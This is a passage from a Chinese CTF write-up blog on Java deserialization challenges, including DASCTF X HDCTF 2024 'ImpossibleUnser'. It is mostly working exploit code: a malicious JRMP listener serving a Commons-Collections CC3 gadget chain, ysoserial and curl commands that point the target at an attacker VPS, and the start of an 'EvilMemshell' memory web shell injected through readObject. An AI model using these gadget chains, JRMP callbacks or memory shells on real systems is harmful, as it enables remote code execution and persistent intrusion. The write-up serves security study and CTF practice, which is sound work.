<span class="hljs-variable">payloadObject</span> <span class="hljs-operator">=</span> CC3.getObject();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(args[ <span class="hljs-number">0</span> ]);<br>            System.err.println(<span class="hljs-string">&quot;* Opening JRMP listener on &quot;</span> + port);<br>            <span class="hljs-type">JRMPListener</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>(port, payloadObject);<br>            c.run();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Listener error&quot;</span>);<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">this</span>.exit &amp;&amp; ( s = <span class="hljs-built_in">this</span>.ss.accept() ) != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();<br>                        System.err.println(<span class="hljs-string">&quot;Have connection from &quot;</span> + remote);<br><br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is);<br><br>                        <span class="hljs-comment">// Read magic (or HTTP wrapper)</span><br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br><br>                        <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                        <span class="hljs-keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;<br>                            s.close();<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                        <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br><br>                        <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                        <span class="hljs-keyword">switch</span> ( protocol ) &#123;<br>                            <span class="hljs-keyword">case</span> TransportConstants.StreamProtocol:<br>                                out.writeByte(TransportConstants.ProtocolAck);<br>                                <span class="hljs-keyword">if</span> ( remote.getHostName() != <span class="hljs-literal">null</span> ) &#123;<br>                                    out.writeUTF(remote.getHostName());<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    out.writeUTF(remote.getAddress().toString());<br>                                &#125;<br>                                out.writeInt(remote.getPort());<br>                                out.flush();<br>                                in.readUTF();<br>                                in.readInt();<br>                            <span class="hljs-keyword">case</span> TransportConstants.SingleOpProtocol:<br>                                doMessage(s, in, out, <span class="hljs-built_in">this</span>.payloadObject);<br>                                <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">default</span>:<br>                            <span class="hljs-keyword">case</span> TransportConstants.MultiplexProtocol:<br>                                System.err.println(<span class="hljs-string">&quot;Unsupported protocol&quot;</span>);<br>                                s.close();<br>                                <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        bufOut.flush();<br>                        out.flush();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>                        e.printStackTrace(System.err);<br>                    &#125;<br>                    <span class="hljs-keyword">finally</span> &#123;<br>                        System.err.println(<span class="hljs-string">&quot;Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br><br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> ( s != <span class="hljs-literal">null</span> ) &#123;<br>                    s.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( SocketException e ) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span> <span class="hljs-params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.err.println(<span class="hljs-string">&quot;Reading message...&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br><br>        <span class="hljs-keyword">switch</span> ( op ) &#123;<br>            <span class="hljs-keyword">case</span> TransportConstants.Call:<br>                <span class="hljs-comment">// service incoming RMI call</span><br>                doCall(in, out, payload);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.Ping:<br>                <span class="hljs-comment">// send ack for ping</span><br>                out.writeByte(TransportConstants.PingAck);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.DGCAck:<br>                <span class="hljs-type">UID</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> UID.read(in);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span> <span class="hljs-params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID.read(ois);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( java.io.IOException e ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> ( read.hashCode() == <span class="hljs-number">2</span> ) &#123;<br>            ois.readInt(); <span class="hljs-comment">// method</span><br>            ois.readLong(); <span class="hljs-comment">// hash</span><br>            System.err.println(<span class="hljs-string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Sending return with payload for obj &quot;</span> + read);<br><br>        out.writeByte(TransportConstants.Return);<span class="hljs-comment">// transport op</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(out, <span class="hljs-built_in">this</span>.classpathUrl);<br><br>        oos.writeByte(TransportConstants.ExceptionalReturn);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>().write(oos);<br><br>        oos.writeObject(payload);<br><br>        oos.flush();<br>        out.flush();<br><br>        <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;deprecation&quot;&#125;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeDummyObject</span> <span class="hljs-params">(String className)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">isolation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;&#125;;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Dummy.class));<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cp.get(Dummy.class.getName());<br>            clazz.setName(className);<br>            <span class="hljs-keyword">return</span> clazz.toClass(isolation).newInstance();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarshalOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br>        <span class="hljs-keyword">private</span> URL sendUrl;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MarshalOutputStream</span><span class="hljs-params">(OutputStream out, URL u)</span> <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>            <span class="hljs-built_in">this</span>.sendUrl = u;<br>        &#125;<br>        MarshalOutputStream(OutputStream out) <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">annotateClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.sendUrl != <span class="hljs-literal">null</span>) &#123;<br>                writeObject(<span class="hljs-built_in">this</span>.sendUrl.toString());<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(cl.getClassLoader() <span class="hljs-keyword">instanceof</span> URLClassLoader)) &#123;<br>                writeObject(<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cb</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">for</span> (URL u : us) &#123;<br>                    cb += u.toString();<br>                &#125;<br>                writeObject(cb);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Serializes a location from which to load the specified class.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">annotateProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            annotateClass(cl);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dummy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们使用CC3的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.boogipop.Solutions;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> SerializeUtils.getTemplate();<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//CC1后半</span><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">//随便改成什么Transformer</span><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> LazyMap.class.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazymap,chainedTransformer);<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是一些Serialize的方法包，这里省略。</p><p>直接打一个jar包，放vps上开JRMPClient：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar nocc_exp.jar port<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-all.jar JRMPClient vps:port|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://localhost:9877/ -d <span class="hljs-string">&quot;rO0AB.....&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927191025308.png" alt="image-20240927191025308"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927191134707.png" alt="image-20240927191134707"></p><h2 id="DASCTF-X-HDCTF-2024-ImpossibleUnser"><a href="#DASCTF-X-HDCTF-2024-ImpossibleUnser" class="headerlink" title="DASCTF X HDCTF 2024 - ImpossibleUnser"></a>DASCTF X HDCTF 2024 - ImpossibleUnser</h2><p>这道题是一个套皮题，其实就是一个简单的用SpEl写入jre然后反序列化的操作。这道也是当时打出来最多的。</p><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>审计源码可以发现有3个路由，其中index路由会列出&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre目录文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8000</span>), <span class="hljs-number">0</span>);<br>        server.createContext(<span class="hljs-string">&quot;/ctf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SPELHandler</span>());<br>        server.createContext(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexHandler</span>());<br>        server.createContext(<span class="hljs-string">&quot;/unser&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnserHandler</span>());<br>        server.setExecutor(<span class="hljs-literal">null</span>);<br>        server.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;index访问，会发现jre下有classes目录，然后unser路由就是一个反序列化入口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange httpExchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-type">InputStream</span> <span class="hljs-variable">requestBody</span> <span class="hljs-operator">=</span> httpExchange.getRequestBody();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> readInputStream(requestBody);<br>       <span class="hljs-keyword">if</span> (!body.equals(<span class="hljs-string">&quot;&quot;</span>))&#123;<br>           Map&lt;String, String&gt; PostData = parseFormData(body);<br>           String payload=PostData.get(<span class="hljs-string">&quot;unser&quot;</span>);<br>           payload= URLDecoder.decode(payload);<br>           <span class="hljs-keyword">try</span> &#123;<br>               base64deserial(payload);<br>           &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>           &#125;<br>           String response=<span class="hljs-string">&quot;Welcome to My Challenge&quot;</span>;<br>           httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>, response.length());<br>           <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>           os.write(response.getBytes());<br>           os.close();<br>       &#125;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Give me some payload Plz Unser me&quot;</span>;<br>       httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>, response.length());<br>       <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>       os.write(response.getBytes());<br>       os.close();<br>   &#125;<br></code></pre></td></tr></table></figure><p>但是没有任何的依赖和利用链，并且还存在一个SPEL注入的入口，但是做了过滤，无法直接rce。</p><p>这里就需要配合SPEL去写一个恶意的class文件到jre&#x2F;classes目录下，构造的恶意类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilMemshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, HttpHandler &#123;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> InterruptedException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">threadsFeld</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>            threadsFeld.setAccessible(<span class="hljs-literal">true</span>);<br>            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);<br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> threads[<span class="hljs-number">1</span>];<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">targetField</span> <span class="hljs-operator">=</span> thread.getClass().getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);<br>            targetField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> targetField.get(thread);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">this$0Field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;this$0&quot;</span>);<br>            <span class="hljs-built_in">this</span>$0Field.setAccessible(<span class="hljs-literal">true</span>);<br>            object = <span class="hljs-built_in">this</span>$0Field.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">contextsField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;contexts&quot;</span>);<br>            contextsField.setAccessible(<span class="hljs-literal">true</span>);<br>            object = contextsField.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">listField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;list&quot;</span>);<br>            listField.setAccessible(<span class="hljs-literal">true</span>);<br>            java.util.<span class="hljs-type">LinkedList</span> <span class="hljs-variable">linkedList</span> <span class="hljs-operator">=</span> (java.util.LinkedList)listField.get(object);<br>            object = linkedList.get(<span class="hljs-number">0</span>);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            